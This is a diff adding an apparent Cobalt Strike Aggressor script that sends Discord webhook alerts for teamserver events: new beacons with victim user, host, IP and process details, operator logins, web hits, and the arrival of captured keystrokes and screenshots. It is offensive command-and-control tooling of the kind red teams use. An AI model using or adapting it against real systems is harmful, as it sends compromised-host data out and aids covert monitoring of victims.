@@ -1,0 +1,78 @@
+# Author: @nickvourd.
+# Spacial thanks to @sec_groundzero.
+# Based on the work of @bluescreenofjeff.
+
+$discord_webhookURL = 'https://discord.com/api/webhooks/XXXX'; # Change this with your Discord webhook url
+$teamserver_hostname = 'XXXXXX'; # Change this with your hostname
+$discord_emoji_beacon = ':skull_crossbones:';
+$discord_emoji_connect = ':warning:';
+$discord_emoji_web_hit = ':bell:';
+$discord_emoji_info = ':information_source:';
+$discord_emoji_message = ':speech_balloon:';
+$discord_emoji_site = ':construction_worker:';
+$discord_emoji_keystrokes = ':key:';
+$discord_emoji_screenshot = ':eyes:';
+
+# New Beacon Alert
+on beacon_initial {
+    $user = beacon_data($1)["user"];
+    $computer = beacon_data($1)["computer"];
+    $host = beacon_data($1)["host"];
+    $arch = beacon_data($1)["barch"];
+    $external = beacon_data($1)["external"];
+    $internal = beacon_data($1)["internal"];
+    $listener = beacon_data($1)["listener"];
+    $process = beacon_data($1)["process"];
+    $pid = beacon_data($1)["pid"];
+    
+    @curl_command = @('curl','-X','POST','-H', 'Content-Type: application/json', '--data-raw', '{"content": "'.$discord_emoji_beacon.' New Beacon on '.$teamserver_hostname.'. GameOn!\n\nInitial beacon from '.$user.'@'.$host.' ('. $computer .')\n\n'.$discord_emoji_info.' Beacon details:\n\nExternal: '.$external.'\nInternal: '.$internal.'\nListener: '.$listener.'\nUser: '.$user.'\nComputer: '.$computer.'\nProccess: '.$process.'\nPid: '.$pid.'\nArch: '.$arch.'"}', $discord_webhookURL);
+    exec(@curl_command);
+}
+
+# New CS Client Connected Alert
+on event_join {
+    @curl_command = @('curl', '-X', 'POST', '-H', 'Content-Type: application/json', '--data-raw', '{"content": "'.$discord_emoji_connect.' '.$1.' has connected to '.$teamserver_hostname.'!\n\n'.$discord_emoji_info.' Active CS users:\n\n'.users().'"}', $discord_webhookURL);
+    exec(@curl_command);
+}
+
+# CS Client Disconnected Alert
+on event_quit {
+    @curl_command = @('curl', '-X', 'POST', '-H', 'Content-Type: application/json', '--data-raw', '{"content": "'.$discord_emoji_connect.' '.$1.' has disconnected from '.$teamserver_hostname.'!\n\n'.$discord_emoji_info.' Active CS users:\n\n'.users().'"}', $discord_webhookURL);
+    exec(@curl_command);
+}
+
+# CS Client Public Message Event Alert
+on event_public {
+    @curl_command = @('curl', '-X', 'POST', '-H', 'Content-Type: application/json', '--data-raw', '{"content": "'.$discord_emoji_message.' New public message from: '.$1.'\n\n'.$discord_emoji_info.' Message content:\n\n '.$2.'"}', $discord_webhookURL);
+    exec(@curl_command);
+}
+
+# New Site Event Log Alert
+on event_newsite {
+    @curl_command = @('curl', '-X', 'POST', '-H', 'Content-Type: application/json', '--data-raw', '{"content": "'.$discord_emoji_site.' '.$1.' set up a new site on '.$teamserver_hostname.'!\n\n'.$discord_emoji_info.' New site details:\n\n'.$2.'"}', $discord_webhookURL);
+    exec(@curl_command);
+}
+
+# New Keystrokes Alert
+on keystrokes {
+    $keyuser = $1['user'];
+    $keytitle = $1['title'];
+    
+    @curl_command = @('curl', '-X', 'POST', '-H', 'Content-Type: application/json', '--data-raw', '{"content": "'.$discord_emoji_keystrokes.' Received new Keystrokes from '.$keytitle.' by '.$keyuser.'!"}', $discord_webhookURL);
+    exec(@curl_command);
+}
+
+# New Web Hit Alert
+on web_hit {
+    @curl_command = @('curl','-X','POST', '-H', 'Content-Type: application/json', '--data-raw', '{"content": "'.$discord_emoji_web_hit.' New Web hit!\n\n'.$discord_emoji_info.' Web Log details:\n\nFrom: '.$3.'\nRequest: '.$1.' '.$2.'\nResponse: '.$5.'\nUser-Agent: '.$4.'"}',$discord_webhookURL);
+    exec(@curl_command);
+}
+
+# New Screenshot Alert
+on screenshots {
+    $screenuser = $1['user'];
+    $screentitle = $1['title'];
+    
+    @curl_command = @('curl', '-X', 'POST', '-H', 'Content-Type: application/json', '--data-raw', '{"content": "'.$discord_emoji_screenshot.' Received new screenshot of '.$screentitle.' by '.$screenuser.'!"}', $discord_webhookURL);
+    exec(@curl_command);
+}
